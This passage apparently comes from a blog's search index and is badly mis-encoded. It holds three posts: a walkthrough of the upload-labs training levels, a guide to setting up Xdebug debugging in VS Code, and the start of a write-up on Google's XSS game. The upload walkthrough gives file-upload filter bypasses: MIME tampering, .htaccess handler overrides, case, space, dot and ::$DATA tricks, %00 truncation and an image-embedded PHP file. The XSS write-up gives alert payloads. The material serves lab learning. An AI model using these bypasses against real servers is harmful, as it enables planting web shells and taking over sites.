ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; åˆ†æ åç«¯phpä»£ç å¯¹æ–‡ä»¶çš„typeè¿›è¡Œäº†æ ¡éªŒï¼Œä»…å…è®¸ä¸Šä¼ image/jpegç±»å‹ ç»•è¿‡ ä¸Šä¼ shell.phpï¼ŒæŠ“åŒ…æ”¹type pass -03ä»£ç  1234567891011$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º åˆ†æ å®šä¹‰äº†ä¸€ä¸ªæ–‡ä»¶åç¼€åé»‘åå•ï¼šaspã€aspxã€phpã€jspæ–‡ä»¶ä¸å¯ä¸Šä¼  è¿˜ä¼šå¯¹æ–‡ä»¶è¿›è¡Œæ—¶é—´æˆ³å‘½ä»¤(éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œå¤åˆ¶æ–‡ä»¶è·¯å¾„å³å¯è·å¾—æ–‡ä»¶åï¼Œå¯ç»•è¿‡) ç»•è¿‡ åˆ©ç”¨apacheè§£ææ¼æ´ï¼Œå°†åç¼€åæ”¹ä¸ºphp3 PASS-04 ä»£ç  1234567891011$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º åˆ†æ é»‘åå•é‡Œçš„æ–‡ä»¶åç¼€åå¢å¤šäº† ç»•è¿‡ ä¸Šä¼ .hataccessæ–‡ä»¶ .htaccessæ–‡ä»¶ .htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€å¯¹å½“å‰ç›®å½•é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚ ä¸»è¦ä½œç”¨ï¼šURLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ã€‚ ä½œç”¨èŒƒå›´ï¼šå½“å‰ç›®å½•ã€‚ httpd.confhttpd.confæ˜¯apacheçš„å…¨å±€é…ç½®æ–‡ä»¶ åœ¨httpd.confä¸­åŠ å…¥ä¸‹é¢å‘½ä»¤ 12345# å°†phtmlå½“ä½œphpæ–‡ä»¶è§£æAddType application/x-httpd-php .php .phtml# å°†æ‰€æœ‰æ–‡ä»¶éƒ½å½“ä½œphpæ–‡ä»¶è§£æSetHandler application/x-httpd-php è¿™ä¸¤æ¡å‘½ä»¤å¯¹åº”åˆ°.htaccessä¸­çš„è¯ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·å†™ 12345# å°†æ‰€æœ‰æ–‡ä»¶å½“ä½œphpè§£æAddType application/x-httpd-php # å°†jpgæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æAddType application/x-httpd-php .jpg ç»•è¿‡äº†è§£äº†.htaccessæ–‡ä»¶åï¼Œæˆ‘ä»¬æ¥ç»•è¿‡ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡æœ¬ï¼Œåœ¨æ–‡æœ¬ä¸­å†™å…¥ 1AddType application/x-httpd-php ä¸Šä¼ æˆåŠŸ ç„¶åå°†phpinfo.phpä¿®æ”¹åç¼€åä¸ºï¼š.jpgä¸Šä¼ ï¼ŒæˆåŠŸæ‰§è¡Œ PASS-05ä»£ç  12345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º åˆ†æï¼š è¿‡æ»¤äº†.htaccessï¼Œç¬¬å››å…³çš„æ–¹æ³•ä¸èƒ½ç”¨ ä½†æ˜¯çœ‹äº†ä¸€ä¸‹é»‘åå•ï¼Œå‘ç°æ²¡æœ‰PhPå¤§å°å†™çš„è¿‡æ»¤ ç»•è¿‡ï¼šä¸Šä¼ phpinfo.PhP PASS -06ä»£ç  12345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); //è·å–åç¼€å $file_ext = strtolower($file_ext); //å°†åç¼€åè½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA åˆ†æ è¿™æ®µä»£ç ä¸ä¸Šä¸€å…³ç›¸æ¯”ï¼Œå°‘äº†ä¸€ä¸ªåç¼€åé¦–å°¾å»ç©ºçš„ç¯èŠ‚ï¼ŒçŒœæµ‹æ˜¯åç¼€ååŠ ç©ºç»•è¿‡ ç»•è¿‡ ä¸Šä¼ phpinfo.php ï¼Œç„¶åæŠ“åŒ…åŠ ç©ºæ ¼ PASS-0712345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;);//è·å–åç¼€å $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å°†::$DATAæ›¿æ¢æˆç©ºï¼Œå»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º åˆ†æ å°‘äº†deldotå‡½æ•°åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ æ­¤å¤„å…³æ³¨ä¸€ä¸ªå‡½æ•°ï¼šstrrchr() æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ€åä¸€æ¬¡å‡ºç°ï¼Œå³å‡å¦‚æˆ‘ä¸Šä¼ çš„æ–‡ä»¶åä¸ºtest.php.çš„æ—¶å€™ï¼Œå®ƒè·å–çš„æ˜¯ç©ºå€¼ åœ¨Windowsä¸­ï¼Œæ–‡ä»¶ç³»ç»Ÿä¼šè‡ªåŠ¨å¿½ç•¥æœ«å°¾çš„.ï¼Œä½†æ˜¯åœ¨linuxä¸­åˆ™ä¸è¡Œ ç»•è¿‡ ä¸Šä¼ æ–‡ä»¶åä¸ºtest.php. PASS-08ä»£ç  123456$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º ä»£ç åˆ é™¤äº†å¯¹::$DATAçš„è¿‡æ»¤ï¼Œäº†è§£äº†ä¸€ä¸‹::$DATAï¼Œå…·ä½“è§è¿™ç¯‡æ–‡ç« https://blog.csdn.net/vivilorne/article/details/3841509 ç»•è¿‡ æŠ“åŒ…å°†æ–‡ä»¶åä¿®æ”¹ä¸ºphpinfo.php::$data PASS - 09ä»£ç  1234567$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA$file_ext = trim($file_ext); //é¦–å°¾å»ç©º ç»•è¿‡ï¼š åˆ©ç”¨apacheçš„è§£ææ¼æ´ å½“apacheåœ¨è§£æä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä»å³å¾€å·¦ä¾æ¬¡å¯»æ‰¾.æœ€åå‡ºç°çš„ä½ç½®ï¼Œç„¶åæˆªå–åé¢çš„åç¼€åè¿›è¡Œå¯¹åº”æ–‡ä»¶è§£æ å¦‚æ­¤åç¼€åä¸èƒ½è§£æï¼Œåˆ™ä¼šä¾æ¬¡å‘å‰å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶ååç¼€ ä¸Šä¼ æ–‡ä»¶åä¸ºï¼šphpinfo.php.xxx PASS - 10ä»£ç  123456$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); //å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦ $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//è‹¥å­˜åœ¨é»‘åå•çš„phpä¸­çš„å­—ç¬¦ä¸²ï¼Œåˆ™æ›¿æ¢æˆç©º $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; php åˆ†æï¼šè§æ³¨é‡Š ç»•è¿‡ï¼šåç¼€ååŒå†™ç»•è¿‡ PASS-11ä»£ç  1234567891011121314$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); //è·å–æ–‡ä»¶åç¼€å if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125; è¿™æ¬¡ä½¿ç”¨çš„æ˜¯ç™½åå•é˜²å¾¡ï¼Œä½†æ˜¯æŠ“åŒ…å‘ç°å¯ä»¥æ§åˆ¶è·¯å¾„ ç»•è¿‡ 00%æˆªæ–­ çœ‹åˆ°ä¸Šä¼ è·¯å¾„åé¢è™½ç„¶æœ‰jpgï¼Œä½†æ˜¯å‰é¢æœ‰00æˆªæ–­ï¼Œç³»ç»Ÿä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªç»“æŸå­—ç¬¦ PASS - 12ä»£ç  12345$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯è¿™æ¬¡æ˜¯postä¿®æ”¹æ–‡ä»¶è·¯å¾„ 00æˆªæ–­ï¼Œä¸è¿‡è¿™æ¬¡å®åœ¨hexä¸­æ·»åŠ ï¼Œå› ä¸ºPOSTä¸ä¼šå¯¹%00è¿›è¡Œè§£ç  PASS - 13ä»£ç  12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; åˆ†æï¼šå¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†æ ¡éªŒ ç»•è¿‡ ä¸Šä¼ å›¾ç‰‡é©¬ é¦–å…ˆåˆ¶ä½œå›¾ç‰‡é©¬ 1copy 1.jpg/a + phpinfo.php/b info.png ä¸Šä¼ åè¿›è¡ŒåŒ…å« PASS - 14ä»£ç  1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); // $ext = image_type_to_extension($info[2]); // å–å¾—å›¾åƒç±»å‹çš„æ–‡ä»¶åç¼€ if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; åˆ†æï¼š ç›¸æ¯”ä¸Šä¸€å…³ï¼Œå¯¹æ–‡ä»¶çš„ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ï¼Œgetimagesize()ç”¨äºè·å–ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ ç»•è¿‡ åŒæ ·ä¸Šä¼ å›¾ç‰‡é©¬ PASS - 15123456789101112131415161718function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; ç”¨exif_imagetypeå¯¹ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹è¿›è¡Œäº†åˆ¤æ–­ ä¸Šä¼ å›¾ç‰‡é©¬ç»•è¿‡ PASS - 16ping = str1(IP(dst=â€™â€™,ttl=1,id=175)/ICMP(id=188,seq=1)/bâ€™welcome â€˜) ping.getlayer(ICMP).fields //æˆªå–ICMPåŒ…é‡Œçš„å€¼ ping.getlayer(ICMP).fields .[â€˜å€¼â€™]//æˆªå–ICMPåŒ…é‡Œçš„å€¼ https://www.freebuf.com/articles/web/179954.html","categories":[],"tags":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Windowsä¸‹vscodeé…ç½®PHPåŠ¨æ€è°ƒè¯•ç¯å¢ƒ","slug":"windowsä¸‹vscodeé…ç½®phpåŠ¨æ€è°ƒè¯•","date":"2019-06-19T16:00:00.000Z","updated":"2021-10-22T08:31:39.792Z","comments":true,"path":"2019/06/20/windowsä¸‹vscodeé…ç½®phpåŠ¨æ€è°ƒè¯•/","link":"","permalink":"http://example.com/2019/06/20/windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEphp%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","excerpt":"æ‰€éœ€ç½‘å€ï¼šhttps://xdebug.org/wizard","text":"æ‰€éœ€ç½‘å€ï¼šhttps://xdebug.org/wizard è·å–xdebugæ–‡ä»¶æ‰“å¼€ä¸Šè¿°ç½‘å€ï¼Œå°†è‡ªå·±ç¯å¢ƒä¸‹phpinfo()å†…å®¹å…¨éƒ¨å¤åˆ¶åˆ°æ–¹æ¡†ä¸­ï¼Œç„¶åç‚¹å‡»ä¸‹é¢çš„åˆ†ææŒ‰é’®ï¼š åˆ†æå®Œæˆåï¼Œé¡µé¢ä¼šå‡ºç°è¿™æ®µæ–‡å­— é…ç½®php.iniæ ¹æ®æ­¥éª¤ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶å°†ä»–æ”¾åœ¨æŒ‡å®šçš„è·¯å¾„ä¸­åï¼Œæ‰“å¼€å½“å‰phpç‰ˆæœ¬çš„php.iniï¼Œå¢åŠ ä¸‹é¢çš„å†…å®¹ï¼š 123 xdebug.remote_enable = True xdebug.remote_autostart = Truezend_extension = E:\\phpstudy\\PHPTutorial\\php\\php-7.2.1-nts\\ext\\php_xdebug-2.9.6-7.2-vc15-nts.dll é…ç½®vscodeæ‰“å¼€vscodeï¼Œå®‰è£…PHP debugæ’ä»¶ ctrl+, æœç´¢è®¾ç½®ï¼šphp.validate.executablePathï¼Œç‚¹å‡»edit å°†æœ¬æœºç¯å¢ƒçš„phpæ‰§è¡Œexeè·¯å¾„å¡«å…¥æ–‡ä»¶ä¸­ï¼š æµ‹è¯• ç‚¹å‡»vscodeçš„debugeræŒ‰é’®ï¼Œè¿›å…¥å open a folderåï¼Œç•Œé¢ä¼šæ”¹å˜ï¼š ç‚¹å‡»åï¼Œç¼–è¾‘launch.jsonï¼Œé€‰æ‹©PHPï¼š vscodeä¼šè‡ªåŠ¨åˆ›å»ºæ‹¥æœ‰å¦‚ä¸‹å†…å®¹çš„jsonæ–‡ä»¶ï¼š 12345678910111213141516171819202122&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Listen for XDebug&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;port&quot;: 9000 &#125;, &#123; &quot;name&quot;: &quot;Launch currently open script&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;port&quot;: 9000 &#125; ]&#125; ç„¶ååœ¨runé‚£é‡Œç‚¹å‡»listen for xdebugerï¼Œå†æµè§ˆå™¨è®¿é—®æƒ³è¦è°ƒè¯•çš„æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°ç›¸åº”çš„è°ƒè¯•ä¿¡æ¯äº† æ€»ç»“ æ”¹æ–‡ä»¶ä¸€å®šè¦å¤‡ä»½ã€‚ã€‚è¯´å¤šäº†éƒ½æ˜¯æ³ªå•Š","categories":[],"tags":[{"name":"æ­å»ºç¯å¢ƒ","slug":"æ­å»ºç¯å¢ƒ","permalink":"http://example.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"}]},{"title":"Google-XSS-game","slug":"google-xss","date":"2019-06-16T16:00:00.000Z","updated":"2021-10-22T08:30:40.730Z","comments":true,"path":"2019/06/17/google-xss/","link":"","permalink":"http://example.com/2019/06/17/google-xss/","excerpt":"åœ°å€ï¼šhttps://xss-game.appspot.com/level2","text":"åœ°å€ï¼šhttps://xss-game.appspot.com/level2 011&lt;script&gt;alert(1)&lt;/script&gt; 021&lt;img src=x onclick=alert(1)&gt; 03ä»£ç  1234567891011121314151617181920212223242526272829303132function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#x27;/static/level3/cloud&quot; + num + 